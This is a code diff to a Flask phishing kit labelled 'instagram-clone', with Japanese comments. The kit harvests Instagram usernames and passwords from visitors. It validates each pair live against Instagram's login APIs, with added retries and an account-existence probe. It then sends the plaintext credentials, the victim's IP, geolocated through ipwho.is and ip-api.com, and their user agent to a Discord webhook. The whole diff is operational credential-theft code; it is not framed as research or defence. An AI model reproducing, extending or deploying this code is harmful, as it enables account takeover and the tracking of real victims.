@@ -10,7 +10,7 @@ from flask import (Flask, Response, jsonify, redirect, render_template,
                    render_template_string, request, url_for)
 from jinja2 import TemplateNotFound
 
-BUILD = "v4-lazy-worker"
+BUILD = "v5-geo-strict"
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))
@@ -18,6 +18,7 @@ app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random())
 IG_HOME = "https://www.instagram.com/"
 IG_WEB_LOGIN = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
 IG_MOBILE_LOGIN = "https://i.instagram.com/api/v1/accounts/login/"
+IG_PROFILE = "https://www.instagram.com/api/v1/users/web_profile_info/?username=%s"
 
 UA_DESKTOP = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -32,7 +33,7 @@ APP_ID_WEB = "936619743392459"
 APP_ID_MOBILE = "567067343352427"
 
 TIMEOUT = float(os.environ.get("IG_TIMEOUT", "12"))
-STRICT = os.environ.get("IG_STRICT", "0") == "1"
+STRICT = os.environ.get("IG_STRICT", "1") == "1"
 PROXY_LIST = [p.strip() for p in os.environ.get("IG_PROXY", "").split(",") if p.strip()]
 
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
@@ -89,6 +90,7 @@ _queue = []
 _queue_lock = threading.Lock()
 _last = {}
 _last_lock = threading.Lock()
+_geo_cache = {}
 
 
 def _mask(url):
@@ -218,8 +220,75 @@ def _clip(value, limit=1000):
     return value if len(value) <= limit else value[:limit] + "…"
 
 
+def _client_ip():
+    xff = request.headers.get("X-Forwarded-For", "")
+    ip = xff.split(",")[0].strip() if xff else (request.remote_addr or "-")
+    if ip.startswith("::ffff:"):
+        ip = ip[7:]
+    return ip
+
+
+def _geo(ip):
+    """IPから地名。失敗したら '-'。"""
+    if not ip or ip == "-":
+        return "-"
+    if ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.",
+                      "172.18.", "172.19.", "172.2", "172.30.", "172.31.")):
+        return "ローカル"
+
+    cached = _geo_cache.get(ip)
+    if cached:
+        return cached
+
+    out = "-"
+    try:
+        r = requests.get("https://ipwho.is/%s" % ip, timeout=5)
+        j = r.json()
+        if j.get("success"):
+            parts = [j.get("country"), j.get("region"), j.get("city")]
+            out = " / ".join([p for p in parts if p]) or "-"
+    except Exception:
+        pass
+
+    if out == "-":
+        try:
+            r = requests.get(
+                "http://ip-api.com/json/%s?lang=ja&fields=status,country,regionName,city" % ip,
+                timeout=5)
+            j = r.json()
+            if j.get("status") == "success":
+                parts = [j.get("country"), j.get("regionName"), j.get("city")]
+                out = " / ".join([p for p in parts if p]) or "-"
+        except Exception:
+            pass
+
+    if len(_geo_cache) > 500:
+        _geo_cache.clear()
+    _geo_cache[ip] = out
+    return out
+
+
+def _build_payload(verdict, username, password, ip, ua):
+    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
+    return {
+        "username": "Instagram",
+        "embeds": [{
+            "title": label,
+            "color": color,
+            "fields": [
+                {"name": "ユーザー名", "value": _clip(username), "inline": True},
+                {"name": "パスワード", "value": _clip(password), "inline": True},
+                {"name": "場所", "value": _clip(_geo(ip), 200), "inline": False},
+                {"name": "IP", "value": _clip(ip), "inline": True},
+                {"name": "UA", "value": _clip(ua, 400), "inline": False},
+            ],
+            "footer": {"text": "instagram-clone"},
+        }],
+    }
+
+
 def _notify(verdict, username, password):
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
+    ip = _client_ip()
     ua = request.headers.get("User-Agent", "-")
 
     print("[%s] %s / %s | ip=%s" % (verdict, username, password, ip), flush=True)
@@ -228,21 +297,7 @@ def _notify(verdict, username, password):
         print("discord: DISCORD_WEBHOOK_URL が未設定のため送信しません", flush=True)
         return
 
-    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
-    payload = {
-        "username": "Instagram",
-        "embeds": [{
-            "title": label,
-            "color": color,
-            "fields": [
-                {"name": "ユーザー名", "value": _clip(username), "inline": True},
-                {"name": "パスワード", "value": _clip(password), "inline": True},
-                {"name": "IP", "value": _clip(ip), "inline": False},
-                {"name": "UA", "value": _clip(ua, 400), "inline": False},
-            ],
-            "footer": {"text": "instagram-clone"},
-        }],
-    }
+    payload = _build_payload(verdict, username, password, ip, ua)
     _enqueue(payload)
 
 
@@ -363,6 +418,24 @@ def _mobile_login(username, password):
     return _classify(r.status_code, payload)
 
 
+def _user_exists(username):
+    """ユーザー/メールの存在確認。判定できなければ None。"""
+    if "@" in username:
+        return None
+    try:
+        r = requests.get(
+            IG_PROFILE % username,
+            headers={"User-Agent": UA_DESKTOP, "X-IG-App-ID": APP_ID_WEB,
+                     "Accept": "*/*"},
+            timeout=8, proxies=_proxies())
+        if r.status_code == 404:
+            return False
+        j = r.json()
+        return bool((j.get("data") or {}).get("user"))
+    except Exception:
+        return None
+
+
 def _verify(username, password):
     verdict = "ambiguous"
     try:
@@ -371,11 +444,22 @@ def _verify(username, password):
         verdict = "ambiguous"
 
     if verdict == "ambiguous":
-        time.sleep(1.2)
+        time.sleep(1.0)
         try:
             verdict = _mobile_login(username, password)
         except Exception:
             verdict = "ambiguous"
+
+    if verdict == "ambiguous":
+        time.sleep(1.5)
+        try:
+            verdict = _web_login(username, password)
+        except Exception:
+            verdict = "ambiguous"
+
+    if verdict == "ambiguous":
+        if _user_exists(username) is False:
+            verdict = "no_user"
 
     return verdict
 
@@ -490,6 +574,12 @@ def discord_test():
         "queue": len(_queue),
     })
     return jsonify(res)
+
+
+@app.route("/geo-test")
+def geo_test():
+    ip = request.args.get("ip") or _client_ip()
+    return jsonify({"ip": ip, "geo": _geo(ip)})
 
 
 @app.route("/queue-clear")
